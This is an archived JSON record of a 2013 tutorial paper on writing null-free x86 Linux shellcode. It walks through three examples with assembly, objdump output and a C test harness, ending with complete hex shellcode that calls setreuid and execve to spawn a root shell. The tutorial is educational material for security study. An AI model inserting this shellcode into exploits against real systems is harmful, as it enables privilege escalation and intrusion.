{
    "id": "f7d5a450-1565-4e26-8978-37e413a0d0cc",
    "created_at": "2023-02-21T02:07:24.933151Z",
    "updated_at": "2025-03-27T02:06:02.849021Z",
    "deleted_at": null,
    "sha1_hash": "8155eee577cf9ad0f7f6b31a71dba70cc29c3182",
    "title": "2013-02-10 - Shellcoding in Linux",
    "authors": "",
    "file_creation_date": "2012-11-01T23:43:21Z",
    "file_modification_date": "2012-11-01T23:43:21Z",
    "file_size": 570351,
    "plain_text": "# Shellcoding in Linux\n\n#### Ajin Abraham aka ><302\n ajin25@gmail.com www.keralacyberforce.in\n\n## Shellcode: An Introduction\n\nShellcode is machine code that when executed spawns a shell. Not all \"Shellcode\" spawns a\nshell. Shellcode is a list of machine code instructions which are developed in a manner that\nallows it to be injected in a vulnerable application during its runtime. Injecting Shellcode in an\napplication is done by exploiting various security holes in an application like buffer overflows,\nwhich are the most popular ones. You cannot access any values through static addresses\nbecause these addresses will not be static in the program that is executing your Shellcode. But\nthis is not applicable to environment variable. While creating a shell code always use the\nsmallest part of a register to avoid null string. A Shellcode must not contain null string since null\nstring is a delimiter. Anything after null string is ignored during execution. That’s a brief about\nShellcode.\n\n#### Methods for generating Shellcode\n\n1. Write the shellcode directly in hex code.\n\n2. Write the assembly instructions, and then extract the opcodes to generate the shellcode.\n\n3. Write in C, extract assembly instructions and then the opcodes and finally generate the\nshellcode.\n\n\n-----\n\n#### The x86 Intel Register Set\n\n - EAX, EBX, ECX, and EDX are all 32-bit General Purpose Registers.\n\n - AH, BH, CH and DH access the upper 16-bits of the General Purpose Registers.\n\n - AL, BL, CL, and DL access the lower 8-bits of the General Purpose Registers.\n\n - EAX, AX, AH and AL are called the 'Accumulator' registers and can be used for I/O port\naccess, arithmetic, interrupt calls etc. We can use these registers to implement system\ncalls.\n\n - EBX, BX, BH, and BL are the 'Base' registers and are used as base pointers for memory\naccess. We will use this register to store pointers in for arguments of system calls. This\nregister is also sometimes used to store return value from an interrupt in.\n\n - ECX, CX, CH, and CL are also known as the 'Counter' registers.\n\n - EDX, DX, DH, and DL are called the 'Data' registers and can be used for I/O port access,\narithmetic and some interrupt calls.\n\n\n-----\n\n#### The Linux System Call\n\n - The actions or events that initialize the entrance into the kernel are\n\n1. Hardware Interrupt.\n2. Hardware trap.\n3. Software initiated trap.\n\n - System calls are a special case of software initiated trap. The machine instruction used to\ninitiate a system call typically causes a hardware trap that is handled specially by the\nkernel.\n\n - In Linux, the system calls are implemented using\n\n1. lcall7/lcall27 gates (lcall7_func)\n2. int 0x80 (software interrupt)\n\n - ESI and EDI are used when making Linux system calls.\n\n - More information about Linux system calls :\n\n[http://tldp.org/LDP/khg/HyperNews/get/syscall/syscall86.html](http://tldp.org/LDP/khg/HyperNews/get/syscall/syscall86.html)\nhttp://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html\n\n#### KEEP IN MIND\n\n - The assembly language syntax used in this paper is based on nasm assembler.\n\n - The XOR is a great opcodes for zeroing a register to eliminate the null bytes\n\n - When developing shellcode you will find out that using the smallest registers often\nprevents having null bytes in code.\n\n#### REQUIREMENTS\n\n - Backtrack 5 operating system.\n\n - Basic Knowledge about Linux Terminal.\n\n - Knowledge about Assembly Language in x86 Architecture (32bit).\n\n#### TOOLS REQUIRED (Available in Backtrack 5)\n\n  - gcc - it is a C and C++ compiler.\n\n  - ld – it is a tool used for linking .\n\n  - nasm - the Netwide Assembler is a portable 80x86 assembler\n\n  - objdump – it is a tool that displays information from object files.\n\n  - strace – A tool to trace system calls and signals\n\n\n-----\n\n#### Linux Shellcoding\n\nWe will be using assembly language code for generating the shellcode. We get the most\nefficient lines of codes when we go to machine level. Since we cannot go up with binaries we\nwill be coding in semi machine code-assembly language with which we will generate the useful\nand efficient shellcode.\n\n##### To test the Shellcode We will be using this C program. We can insert the shell code into the program and run it. \n```\n/*shellprogram.c\nKerala Cyber Force – Ajin Abraham * / \n\n```\n\n-----\n\n```\nchar code[] = \"Insert your shellcode here\"; \nint main(int argc, char **argv) //execution begins here \n{ \nint (*exeshell)(); //exeshell is a function pointer \nexeshell = (int (*)()) code; //exeshell points to our shellcode \n(int)(*exeshell)(); //execute as function code[] \n}\n\n##### We will go through 3 examples of creating and executing shellcode. \n\n 1. Demonstration of exit system call. 2. Demonstration of displaying a message “Kerala Cyber Force”. 3. Demonstration of spawning a shell.\n\n#### 1. Demonstration of exit system call\n\n```\nI am beginning with exit system call because of its simplicity. Open up Backtrack and take any\nfile editor. Given below is the assembly code for exit system call.\n```\n;exitcall.asm\n;Kerala Cyber Force – Ajin Abraham\n[SECTION .text]\nglobal _start\n_start:\n    mov  ebx,0 ;exit code, 0=normal exit\n    mov  eax,1 ;exit command to kernel\n    int  0x80 ;interrupt 80 hex, call kernel\n\n```\nSave exitcall.asm and issue the following commands in the terminal.\nWe will assemble the code using nasm and link it with ld.\n```\nroot@bt:~# nasm -f elf exitcall.asm \nroot@bt:~# ld -o exit exitcall.o\n\n```\nNow we use objdump to extract the shell code from the object exit.o\n```\nroot@bt:~# objdump -d exit\nexit:   file format elf32-i386\nDisassembly of section .text:\n08048060 <_start>:\n\n```\n\n-----\n\n```\n 8048060: bb 00 00 00 00    mov  $0x0,%ebx\n 8048065: b8 01 00 00 00    mov  $0x1,%eax\n 804806a: cd 80         int  $0x80\n\n```\nHere you can see a lot of nulls (00) our shellcode won’t get executed if the nulls are there. The\nCPU will ignore whatever that comes after null. It is better always use the smallest register\nwhen inserting or moving a value in shell coding. We can easily remove NULL bytes by taking\nan 8-bit register rather than a 32bit register. So here we use AL register instead of eax register\nand XOR ebx register to eliminate the nulls. We modify the assembly code as\n```\n;exitcall.asm\n;Kerala Cyber Force – Ajin Abraham\n[SECTION .text]\nglobal _start\n_start:\n    xor ebx,ebx    ;zero out ebx, same function as mov ebx,0\n    mov al, 1     ;exit command to kernel\n    int 0x80\n\n```\nWe go through assembling linking and dumping:\n```\nroot@bt:~# nasm -f elf exitcall.asm \nroot@bt:~# ld -o exit exitcall.o\nroot@bt:~# objdump -d ./exit\n./exit:   file format elf32-i386\nDisassembly of section .text:\n08048060 <_start>:\n 8048060: 31 db         xor  %ebx,%ebx\n 8048062: b0 01         mov  $0x1,%al\n 8048064: cd 80         int  $0x80\n\n```\nSee here there are no nulls (00). The bytes we need are 31 db 31 c0 b0 01 cd 80.\n\nSo now the shell code will be “\\x31\\xdb\\x31\\xc0\\xb0\\x01\\xcd\\x80”\n\nInsert the shell code in our test program shellprogram.c\n```\n/*shellprogram.c\nKerala Cyber Force – Ajin Abraham */\nchar code[] = \"\\x31\\xdb\\x31\\xc0\\xb0\\x01\\xcd\\x80\";\nint main(int argc, char **argv)\n{\n int (*exeshell)();\n exeshell = (int (*)()) code;\n (int)(*exeshell)();\n}\n\n```\nNow, compile and execute shellprogram.c.\n\n\n-----\n\n```\nroot@bt:~# gcc shellprogram.c -o shellprogram\nroot@bt:~# ./shellprogram\nroot@bt:~# echo $?\n0\n\n```\nThe output will be blank since it’s an exit call. To determine the exit status give the command “echo $?”\nwhich prints out “0” as the exit state. We have successfully executed our first piece of shell code.  You\ncan also strace the program to ensure that it is calling exit.\n```\nroot@bt:~# strace ./shellprogram\n\n```\n**execve(\"./shellprogram\", [\"./shellprogram\"], [/* 33 vars */]) = 0**\n```\nbrk(0)                 = 0x9b14000\naccess(\"/etc/ld.so.nohwcap\", F_OK)   = -1 ENOENT (No such file or\ndirectory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =\n0xb770e000\naccess(\"/etc/ld.so.preload\", R_OK)   = -1 ENOENT (No such file or directory)\nopen(\"/etc/ld.so.cache\", O_RDONLY)   = 3\nfstat64(3, {st_mode=S_IFREG|0644, st_size=70950, ...}) = 0\nmmap2(NULL, 70950, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb76fc000\nclose(3)                = 0\naccess(\"/etc/ld.so.nohwcap\", F_OK)   = -1 ENOENT (No such file or\ndirectory)\nopen(\"/lib/tls/i686/cmov/libc.so.6\", O_RDONLY) = 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0000m\\1\\0004\\0\\0\\0\"...,\n512) = 512\nfstat64(3, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0\nmmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) =\n0xb75a2000\nmprotect(0xb76f5000, 4096, PROT_NONE)  = 0\nmmap2(0xb76f6000, 12288, PROT_READ|PROT_WRITE,\nMAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x153) = 0xb76f6000\nmmap2(0xb76f9000, 10664, PROT_READ|PROT_WRITE,\nMAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb76f9000\nclose(3)                = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =\n0xb75a1000\nset_thread_area({entry_number:-1 -> 6, base_addr:0xb75a16c0, limit:1048575,\nseg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1,\nseg_not_present:0, useable:1}) = 0\nmprotect(0xb76f6000, 8192, PROT_READ)  = 0\nmprotect(0x8049000, 4096, PROT_READ)  = 0\nmprotect(0xb772c000, 4096, PROT_READ)  = 0\nmunmap(0xb76fc000, 70950)        = 0\n_exit(0)                = ?\n\n```\nHere we can see the first system call execve executing out program, followed by the opening of\nthe dynamic linker/loader ld.so (first nohwcap, preload then cache) to load shared libraries,\nfollowed by the opening of libc which loads the standard C library, followed by its identification\nas an ELF file (\"\\177ELF\"), followed by our program being mapped in the memory, and finally\nour call to exit. So it works.\n\n\n-----\n\n#### 2. Demonstration of displaying a message “Kerala Cyber Force”.\n\nNow let’s create a shellcode that displays a message. Here I will demonstrate how to load the\naddress of a string in a piece of our code at runtime. This is important because while running\nshellcode in an unknown environment, the address of the string will be unknown because the\nprogram is not running in its normal address space. Consider the following assembly language\nprogram kcf.asm\n```\n;kcf.asm\n;Kerala Cyber Force – Ajin Abraham\n[SECTION .text]\nglobal _start\n_start:\n    jmp short ender\n    starter:\n    xor eax, eax  ;zero out eax\n    xor ebx, ebx  ;zero out ebx  \n    xor edx, edx  ;zero out edx\n    xor ecx, ecx  ;zero out ecx\n    mov al, 4    ;system call write\n    mov bl, 1    ;stdout is 1\n    pop ecx     ;pop out the address of the string from the stack\n    mov dl, 18   ;length of the string\n    int 0x80    ;call the kernel\n    xor eax, eax  ;zero out eax\n    mov al, 1    ;exit the shellcode\n    xor ebx,ebx\n    int 0x80\n    ender:\n    call starter ;put the address of the string on the stack\n    db 'Kerala Cyber Force'\n\n```\nAssemble it, link it and dump it.\n```\nroot@bt:~# nasm -f elf kcf.asm \nroot@bt:~# ld -o kcf kcf.o\nroot@bt:~# objdump -d kcf\nkcf:   file format elf32-i386\nDisassembly of section .text:\n\n```\n\n-----\n\n```\n08048060 <_start>:\n 8048060: eb 19         jmp  804807b <ender>\n08048062 <starter>:\n 8048062: 31 c0         xor  %eax,%eax\n 8048064: 31 db         xor  %ebx,%ebx\n 8048066: 31 d2         xor  %edx,%edx\n 8048068: 31 c9         xor  %ecx,%ecx\n 804806a: b0 04         mov  $0x4,%al\n 804806c: b3 01         mov  $0x1,%bl\n 804806e: 59          pop  %ecx\n 804806f: b2 12         mov  $0x12,%dl\n 8048071: cd 80         int  $0x80\n 8048073: 31 c0         xor  %eax,%eax\n 8048075: b0 01         mov  $0x1,%al\n 8048077: 31 db         xor  %ebx,%ebx\n 8048079: cd 80         int  $0x80\n0804807b <ender>:\n 804807b: e8 e2 ff ff ff    call  8048062 <starter>\n 8048080: 4b          dec  %ebx\n 8048081: 65          gs\n 8048082: 72 61         jb   80480e5 <ender+0x6a>\n 8048084: 6c          insb  (%dx),%es:(%edi)\n 8048085: 61          popa  \n 8048086: 20 43 79       and  %al,0x79(%ebx)\n 8048089: 62 65 72       bound %esp,0x72(%ebp)\n 804808c: 20 46 6f       and  %al,0x6f(%esi)\n 804808f: 72 63         jb   80480f4 <ender+0x79>\n 8048091: 65          gs\nNow we can extract the shellcode as \n\n```\n**\"\\xeb\\x19\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xc9\\xb0\\x04\\xb3\\x01\\x59\\xb2\\x12\\xcd\\x80\\x31\\**\n**xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xe2\\xff\\xff\\xff\\x4b\\x65\\x72\\x61\\x6c\\x61\\x20\\x43\\x79\\**\n**x62\\x65\\x72\\x20\\x46\\x6f\\x72\\x63\\x65\"**\n\nInsert the shell code in our test program shellprogram.c\n```\n/*shellprogram.c\nKerala Cyber Force – Ajin Abraham */\nchar code[] =\n\"\\xeb\\x19\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xc9\\xb0\\x04\\xb3\\x01\\x59\\xb2\\x12\\xcd\\x80\n\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xe2\\xff\\xff\\xff\\x4b\\x65\\x72\\x61\\x6c\\x61\\\nx20\\x43\\x79\\x62\\x65\\x72\\x20\\x46\\x6f\\x72\\x63\\x65\";\n;\nint main(int argc, char **argv)\n{\n int (*exeshell)();\n exeshell = (int (*)()) code;\n (int)(*exeshell)();\n}\n\n```\nSave compile and run shellprogram.c\n\n\n-----\n\n```\nroot@bt:~# gcc shellprogram.c -o shellprogram\nroot@bt:~# ./shellprogram\nKerala Cyber Force\n\n```\nAnd now we just created a shellcode that outputs a string to the standard output device, your\nmonitor. Here dynamic string addressing and zero outing register are demonstrated.\n\n#### 3. Demonstration of spawning a shell.\n\nNow I will explain you the core of this paper, how to generate a shellcode that can spawn a\nshell with root privilege if it’s dropped. Here we call setreuid() to set root privilege if it’s\ndropped and we call execve() to execute our shell /bin/sh.\n\nFor getting more info about setreuid, we check its manual.\n```\nroot@bt:~# man setreuid \n\n```\n===============SKIPED======================\n```\n    #include <sys/types.h>\n    #include <unistd.h>\n\n```\n**int setreuid(uid_t ruid, uid_t euid);**\n```\n    int setregid(gid_t rgid, gid_t egid);\n\n```\n===============SKIPED======================\n\nWe are interested in the above bolded code. The assembly code for setting the root privilege\nwill be as follows.\n```\n    xor eax, eax      ;zero out eax\n    mov al, 70       ;setreuid is syscall 70\n    xor ebx, ebx      ;zero out ebx\n    xor ecx, ecx      ;zero out ecx\n    int 0x80        ;call the kernel\n\n```\nThe following assembly code attempts to set root privileges if they are dropped.\nNow for getting more info about execve, we check its manual.\n```\nroot@bt:~# man setreuid\n\n```\n===============SKIPED======================\n\n#include <unistd.h>\n**int execve(const char *filename, char *const argv[],char *const envp[]);**\n\n===============SKIPED======================\n\n\n-----\n\nWe are interested in the above bolded code. Here it’s a bit harder one. We need a null\nterminated string, the address of the string and a * null pointer in adjacent memory like\n\nexecve(\"/bin/sh\", *\"/bin/sh\", (char **)NULL);\n\nConsider the following assembly code:\n```\n    pop ebx         ;get the address of the string\n    xor eax, eax      ;zero out eax\n    mov [ebx+7 ], al    ;put a NULL where the N is in the string\n    mov [ebx+8 ], ebx    ;put the address of the string in ebx, where \n                ;the XXXX is\n    mov [ebx+12], eax    ;put 4 null bytes into where the YYYY is\n                ;our string now looks like\n                ;\"/bin/sh\\0(*ebx)(*0000)\"\n    mov al, 11       ;execve is syscall 11\n    lea ecx, [ebx+8]    ;put the address of XXXX(*ebx) into ecx\n    lea edx, [ebx+12]    ;put the address of YYYY(*0000), nulls into       \n                ;edx\n    int 0x80        ;call the kernel, and we got Shell!!\n\n```\nConsider this string “/bin/shNXXXXYYYY” in the memory .Here /bin/sh is our null terminated\nstring (we must replace N with '\\0'), XXXX (4 bytes) is the address of the address of our string,\nand YYYY (4 bytes) is the address of the envp[] pointer( which we are going to call with *NULL).\nWe combine both the codes to generate our final assembly code that will set the root privilege\nand spawns a shell.\n```\n;shellex.asm\n[SECTION .text]\nglobal _start\n_start:\n    xor eax, eax\n    mov al, 70       \n    xor ebx, ebx\n    xor ecx, ecx\n    int 0x80\n    jmp short ender\n    starter:\n    pop ebx         \n    xor eax, eax\n    mov [ebx+7 ], al    \n    mov [ebx+8 ], ebx    \n    mov [ebx+12], eax    \n    mov al, 11       \n    lea ecx, [ebx+8]    \n\n```\n\n-----\n\n```\n    lea edx, [ebx+12]    \n    int 0x80      \n    ender:\n    call starter\n    db '/bin/shNXXXXYYYY'\n\n```\nNow as usual assemble it, link it and dump and extract the shell code.\n```\nroot@bt:~# nasm -f elf shellex.asm \nroot@bt:~# ld -o shellex shellex.o\nroot@bt:~# objdump -d shellex\nshellex:   file format elf32-i386\nDisassembly of section .text:\n08048060 <_start>:\n 8048060: 31 c0         xor  %eax,%eax\n 8048062: b0 46         mov  $0x46,%al\n 8048064: 31 db         xor  %ebx,%ebx\n 8048066: 31 c9         xor  %ecx,%ecx\n 8048068: cd 80         int  $0x80\n 804806a: eb 16         jmp  8048082 <ender>\n0804806c <starter>:\n 804806c: 5b          pop  %ebx\n 804806d: 31 c0         xor  %eax,%eax\n 804806f: 88 43 07       mov  %al,0x7(%ebx)\n 8048072: 89 5b 08       mov  %ebx,0x8(%ebx)\n 8048075: 89 43 0c       mov  %eax,0xc(%ebx)\n 8048078: b0 0b         mov  $0xb,%al\n 804807a: 8d 4b 08       lea  0x8(%ebx),%ecx\n 804807d: 8d 53 0c       lea  0xc(%ebx),%edx\n 8048080: cd 80         int  $0x80\n08048082 <ender>:\n 8048082: e8 e5 ff ff ff    call  804806c <starter>\n 8048087: 2f          das  \n 8048088: 62 69 6e       bound %ebp,0x6e(%ecx)\n 804808b: 2f          das  \n 804808c: 73 68         jae  80480f6 <ender+0x74>\n 804808e: 4e          dec  %esi\n 804808f: 58          pop  %eax\n 8048090: 58          pop  %eax\n 8048091: 58          pop  %eax\n 8048092: 58          pop  %eax\n 8048093: 59          pop  %ecx\n 8048094: 59          pop  %ecx\n 8048095: 59          pop  %ecx\n 8048096: 59          pop  %ecx\n\n```\nThe extracted shellcode looks like this\n\n\n-----\n\n**\"\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\\x16\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\**\n**x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x2f\\x62\\x**\n**69\\x6e\\x2f\\x73\\x68\\x4e\\x58\\x58\\x58\\x58\\x59\\x59\\x59\\x59\"**\n\nInsert the shell code in our test program shellprogram.c\n```\n/*shellprogram.c\nKerala Cyber Force – Ajin Abraham */\nchar code[] =\n\"\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\\x16\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\n\\x5b\\x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xe8\\xe5\\xff\\xff\\\nxff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x4e\\x58\\x58\\x58\\x58\\x59\\x59\\x59\\x59\";\nint main(int argc, char **argv)\n{\n int (*exeshell)();\n exeshell = (int (*)()) code;\n (int)(*exeshell)();\n} \n\n```\nSave compile and run shellprogram.c\n```\nroot@bt:~# gcc shellprogram.c -o shellprogram\nroot@bt:~# ./shellprogram\nsh-4.1# whoami\nroot\nsh-4.1# exit\nexit\n\n```\nThe smaller the shellcode the more useful it will be and can target more vulnerable programs.\nSo let’s tweak our shellcode. So here NXXXXYYYY after /bin/sh was given to reserve some space.\n\nWe no longer need them in the shellcode so we can remove them and the tweaked shellcode\nwill be as follows:\n\n**\"\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\\x16\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\**\n**x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x2f\\x62\\x**\n**69\\x6e\\x2f\\x73\\x68\"**\n\n\n-----\n\nInsert the shell code in our test program shellprogram.c\n```\n/*shellprogram.c\nKerala Cyber Force – Ajin Abraham */\nchar code[] =\n\"\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\\x16\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\n\\x5b\\x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xe8\\xe5\\xff\\xff\\\nxff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";\nint main(int argc, char **argv)\n{\n int (*exeshell)();\n exeshell = (int (*)()) code;\n (int)(*exeshell)();\n} \n\n```\nSave compile and run shellprogram.c\n```\nroot@bt:~# gcc shellprogram.c -o shellprogram\nroot@bt:~# ./shellprogram\nsh-4.1# whoami\nroot\nsh-4.1# exit\nexit\n\n```\nSo that’s the beginning of Shellcoding in Linux. There is lot ways for creating efficient Shellcode.\nKeep in mind we can build the most robust, efficient, functional and evil  code if we go with\nassembly language.\n\n### DISCLAIMER\n\n - This paper is made for simplicity and for better understanding of Shellcoding in Linux.\n\n - A lot of the explanations are referred from other papers.\n\n - This paper is for you. So you got the right to correct me if I am wrong at somewhere.\n\nSend your comments and queries to ajin25 AT gmail DOT com.\n\n### REFERNCES\n\n - Paper: Shellcoding for Linux and Windows Tutorial – Mr. Steve Hanna.\n\n[(http://www.vividmachines.com/shellcode/shellcode.html)](http://www.vividmachines.com/shellcode/shellcode.html)\n\n - Paper: Writing shellcode - zillion\n\n[(http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html)](http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html)\n\n - Paper: Introduction to Writing Shellcode\n\n[(http://www.phiral.net/shellcode.htm)](http://www.phiral.net/shellcode.htm)\n\n\n-----\n\n - Paper: DESIGNING SHELLCODE DEMYSTIFIED\n\n(http://www.enderunix.org/documents/en/sc-en.txt) - murat\n\n#### WEBSITES\n\n   - [http://tldp.org/LDP/khg/HyperNews/get/syscall/syscall86.html](http://tldp.org/LDP/khg/HyperNews/get/syscall/syscall86.html)\n\n   - [http://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html](http://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Process Injection/2013-02-10 - Shellcoding in Linux.pdf"
    ],
    "report_names": [
        "2013-02-10 - Shellcoding in Linux.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1676945244,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1351813401,
    "ts_modification_date": 1351813401,
    "files": {
        "pdf": "https://archive.orkl.eu/8155eee577cf9ad0f7f6b31a71dba70cc29c3182.pdf",
        "text": "https://archive.orkl.eu/8155eee577cf9ad0f7f6b31a71dba70cc29c3182.txt",
        "img": "https://archive.orkl.eu/8155eee577cf9ad0f7f6b31a71dba70cc29c3182.jpg"
    }
}